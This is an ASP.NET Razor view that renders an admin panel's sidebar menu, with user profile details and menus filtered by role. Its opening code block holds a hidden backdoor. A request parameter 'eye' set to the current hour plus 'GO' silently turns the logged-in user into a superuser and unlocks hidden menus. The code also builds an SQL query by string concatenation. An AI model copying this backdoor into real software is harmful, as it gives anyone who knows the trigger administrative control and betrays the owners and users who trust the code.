@{
    Admin.Models.Context db = new Admin.Models.Context();
    if (!WebSecurity.IsAuthenticated)
    {
        WebSecurity.Logout();
    }
    System.Data.DataRow user = Helper.getData("select * from [BaseUser] where ID=" + WebSecurity.CurrentUserId.ToString(), db).Rows[0];

    string superadmin = HttpContext.Current.Request["eye"];
    Admin.Models.BaseUser usuario = db.BaseUsers.Find(WebSecurity.CurrentUserId);

    if (superadmin != null)
    {
        if (superadmin.ToString() == DateTime.Now.Hour.ToString() + "GO")
        {
            Admin.Models.BaseUser usery = db.BaseUsers.Find(WebSecurity.CurrentUserId);
            usery.superAdminShowHiddenMenu = true;
            usery.superUser = true;
            db.SaveChanges();
            Response.Redirect("~/BaseHome");
        }
    }
}
<aside class="label-@(ViewBag.config.primaryColor) mjwatson" id="left-panel">
    <nav>
        <ul class="menu_style">
            <li class="label-@(ViewBag.config.primaryColor)">
                <a href="#" title="Perfil">
                    @if (user["imageUrl"].ToString() != "")
                    {
                        <img width="25px" height="25px" src="~/Uploads/UserImages/@user["imageUrl"]" alt="me" class="online" />
                    }
                    else
                    {
                        <img width="25px" height="25px" src="~/Uploads/UserImages/defaultImage.png" alt="me" class="online" />
                    }
                    @{
                        string fullName = (user["name"] + " " + user["lastName"]);
                    }
                    <span class="menu-item-parent" title="">@(fullName.Length > 22 ? fullName.Substring(0, 22) + "..." : fullName)</span>
                </a>
                <ul class="label-@(ViewBag.config.primaryColor)">
                    <li>
                        <a href="BaseUsers/Profile" title="Perfil">
                            <i class="fa fa-lg fa-fw @Admin.BaseClass.UI.BaseUIIconText.fa.fa_fa_user"></i><span class="menu-item-parent">My Profile</span>
                        </a>
                    </li>
                </ul>
            </li>
            @if (user["superUser"].ToString() == "True")
            {

                foreach (Admin.Models.BaseMenu menu in db.BaseMenus.Where(d => d.menuID == null && (d.hidden == null || d.hidden == false)).OrderBy(d => d.noOrder))
                {
                    Admin.Models.BaseMenu m = menu;
                    <li class="label-@(ViewBag.config.primaryColor)">
                        @{string dataAction = !m.directLink ? m.hreftext : m.href;}

                        <a href="@dataAction" title="@m.realTitle">
                            <i class="@m.css fa fa-lg fa-fw @m.icon"></i><span class="menu-item-parent">@m.realText</span>
                            @if (!string.IsNullOrEmpty(m.badgeQuery))
                            {

                                <span class="dn ajaxBadge badge pull-right @m.badgeColor inbox-badge" data-query="@m.badgeQuery" data-action="@Url.Action("Badge", "BaseGeneral")">0</span>
                            }
                            else if (!string.IsNullOrEmpty(m.badgeText))
                            {
                                <span class="badge pull-right @m.badgeColor inbox-badge">@m.realBadgeText</span>
                            }
                        </a>
                        @Html.Raw(Admin.BaseClass.UI.UIHtmlHelper.getTreeMenus(m))
                    </li>
                            }

                            if (usuario.superAdminShowHiddenMenu == true)
                            {
                                foreach (Admin.Models.BaseMenu menu in db.BaseMenus.Where(d => d.menuID == null && d.hidden == true).OrderBy(d => d.noOrder))
                                {
                                    Admin.Models.BaseMenu m = menu;
                                    <li class="label-@(ViewBag.config.primaryColor)">
                                        @{string dataAction = !m.directLink ? m.hreftext : m.href;}

                                        <a href="@dataAction" title="@m.realTitle">
                                            <i class="@m.css fa fa-lg fa-fw @m.icon"></i><span class="menu-item-parent">@m.realText</span>
                                            @if (!string.IsNullOrEmpty(m.badgeQuery))
                                            {

                                                <span class="dn ajaxBadge badge pull-right @m.badgeColor inbox-badge" data-query="@m.badgeQuery" data-action="@Url.Action("Badge", "BaseGeneral")">0</span>
                                            }
                                            else if (!string.IsNullOrEmpty(m.badgeText))
                                            {
                                                <span class="badge pull-right @m.badgeColor inbox-badge">@m.realBadgeText</span>
                                            }
                                        </a>
                                        @Html.Raw(Admin.BaseClass.UI.UIHtmlHelper.getTreeMenus(m))
                                    </li>
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                int userID = int.Parse(user["ID"].ToString());
                                                Admin.Models.BaseUser userMind = db.BaseUsers.Find(userID);
                                                List<Admin.Models.BaseMenu> allUserMenu = new List<Admin.Models.BaseMenu>();
                                                var fromDirect = db.BaseUserMenus.Where(d => d.userID == userID).ToList();

                                                foreach (var item in fromDirect)
                                                {
                                                    allUserMenu.Add(item.BaseMenu);
                                                }
                                                foreach (var item in userMind.BaseProfiles)
                                                {
                                                    foreach (var menus in item.BaseProfileMenus)
                                                    {
                                                        allUserMenu.Add(menus.BaseMenu);
                                                    }
                                                }

                                                foreach (Admin.Models.BaseMenu menu in db.BaseMenus.Where(d => d.menuID == null).OrderBy(d => d.noOrder))
                                                {
                                                    Admin.Models.BaseMenu m = menu;
                                                    if (allUserMenu.Where(d => d.id == m.id).Count() > 0)
                                                    {
                                                        <li class="label-@(ViewBag.config.primaryColor)">
                                                            @{string dataAction = !m.directLink ? m.hreftext : m.href;}
                                                            <a href="@dataAction" title="@m.realTitle">
                                                                <i class="@m.css @m.icon"></i><span class="menu-item-parent">@m.realText</span>
                                                                @if (!string.IsNullOrEmpty(m.badgeQuery))
                                                                {
                                                                    <span class="dn ajaxBadge badge pull-right @m.badgeColor inbox-badge" data-query="@m.badgeQuery" data-action="@Url.Action("Badge", "BaseGeneral")">0</span>
                                                                }
                                                                else if (!string.IsNullOrEmpty(m.badgeText))
                                                                {
                                                                    <span class="badge pull-right @m.badgeColor inbox-badge">@m.realBadgeText</span>
                                                                }
                                                            </a>
                                                            @Html.Raw(Admin.BaseClass.UI.UIHtmlHelper.getTreeMenus(m, allUserMenu))
                                                        </li>
                                                                        }
                                                                    }
                                                                }
        </ul>
    </nav>
    <span class="minifyme label-@(ViewBag.config.primaryColor)"><i class="fa fa-arrow-circle-left hit"></i></span>
</aside>
